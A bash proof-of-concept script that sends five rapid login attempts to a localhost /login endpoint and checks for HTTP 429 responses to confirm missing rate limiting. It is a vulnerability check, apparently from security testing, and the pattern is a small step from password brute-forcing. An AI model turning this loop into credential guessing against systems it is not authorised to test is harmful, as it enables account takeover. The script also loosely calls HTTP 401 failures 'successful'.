#!/bin/bash

# POC: Brute Force Attack on Login Endpoint - No Rate Limiting
# This script demonstrates that the /login endpoint lacks rate limiting,
# allowing unlimited rapid login attempts without blocking or delays

TARGET_URL="http://localhost/login"
USERNAME="admin"
RESULTS_FILE="/tmp/brute_force_results.txt"

echo "=== Brute Force POC - Rate Limiting Test ==="
echo "Target: $TARGET_URL"
echo "Testing for rate limiting with 5 rapid login attempts..."
echo ""

# Clear results file
> "$RESULTS_FILE"

# Send 5 rapid consecutive login attempts
for i in 1 2 3 4 5; do
    echo "Attempt $i..."
    START_TIME=$(date +%s%N | cut -b1-13)
    
    # Make the request and capture response
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=$USERNAME&password=test_password_$i" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    END_TIME=$(date +%s%N | cut -b1-13)
    RESPONSE_TIME=$((END_TIME - START_TIME))
    
    # Parse response body and status code
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    
    echo "  Status: $HTTP_CODE | Response time: ${RESPONSE_TIME}ms"
    
    # Log results
    echo "Attempt $i: HTTP $HTTP_CODE - Response time: ${RESPONSE_TIME}ms" >> "$RESULTS_FILE"
    
    # Check for rate limiting indicators
    if [[ "$HTTP_CODE" == "429" ]]; then
        echo "  ⚠️  Rate limiting detected (HTTP 429)"
    elif [[ "$RESPONSE" == *"Too Many Requests"* ]]; then
        echo "  ⚠️  Rate limiting detected (Too Many Requests message)"
    fi
done

echo ""
echo "=== Analysis ==="
cat "$RESULTS_FILE"

echo ""
echo "=== Findings ==="

# Check if all requests returned success (no rate limiting)
SUCCESS_COUNT=$(grep -c "HTTP 401" "$RESULTS_FILE")
RATE_LIMIT_COUNT=$(grep -c "HTTP 429" "$RESULTS_FILE")

echo "Total requests: 5"
echo "Successful requests (not rate limited): $SUCCESS_COUNT"
echo "Rate limited responses (HTTP 429): $RATE_LIMIT_COUNT"

if [ "$RATE_LIMIT_COUNT" -eq 0 ]; then
    echo ""
    echo "❌ VULNERABILITY CONFIRMED: No rate limiting detected"
    echo "All 5 rapid login attempts succeeded without rate limiting"
    exit 0
else
    echo ""
    echo "✓ Rate limiting appears to be in place"
    exit 1
fi